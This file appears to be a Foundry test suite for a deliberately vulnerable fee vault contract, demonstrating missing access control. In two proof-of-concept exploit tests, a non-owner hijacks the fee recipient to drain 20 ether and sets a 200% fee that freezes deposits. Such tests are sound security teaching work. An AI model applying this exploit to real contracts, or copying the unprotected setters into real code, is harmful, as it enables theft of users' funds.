// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {Test, console, stdError} from "forge-std/Test.sol";
import {VulnerableFeeVault} from "../../src/vulnerable/VulnerableFeeVault.sol";

contract AccessControlTest is Test {
    VulnerableFeeVault vault;
    address treasury = makeAddr("treasury");
    address hedi = makeAddr("hedi");
    address hedi2 = makeAddr("hedi2");
    address hedisarrek = makeAddr("hedisarrek");

    function setUp() public {
        vault = new VulnerableFeeVault(treasury); // this test contract is the owner
        vm.deal(hedi, 10 ether);
        vm.deal(hedi2, 10 ether);

        vm.prank(hedi);
        vault.deposit{value: 10 ether}();
        vm.prank(hedi2);
        vault.deposit{value: 10 ether}();
    }

    function test_NormalFee() public {
        vm.prank(hedi);
        vault.withdraw();

        assertEq(hedi.balance, 9.9 ether); // 1% fee
        assertEq(treasury.balance, 0.1 ether);
    }

    function test_Exploit_AttackerHijacksFees() public {
        // hedisarrek is NOT the owner, but nothing stops him
        vm.startPrank(hedisarrek);
        vault.setFeeRecipient(hedisarrek);
        vault.setFee(10_000); // 100%
        vm.stopPrank();

        vm.prank(hedi);
        vault.withdraw();
        vm.prank(hedi2);
        vault.withdraw();

        console.log("hedi got (ETH):", hedi.balance / 1 ether);
        console.log("hedisarrek got (ETH):", hedisarrek.balance / 1 ether);

        assertEq(hedi.balance, 0);
        assertEq(hedi2.balance, 0);
        assertEq(hedisarrek.balance, 20 ether);
        assertEq(treasury.balance, 0);
    }

    function test_Exploit_FeeAbove100PercentFreezesFunds() public {
        vm.prank(hedisarrek);
        vault.setFee(20_000); // 200%

        vm.prank(hedi);
        vm.expectRevert(stdError.arithmeticError);
        vault.withdraw();

        assertEq(address(vault).balance, 20 ether); // money is stuck inside
    }
}
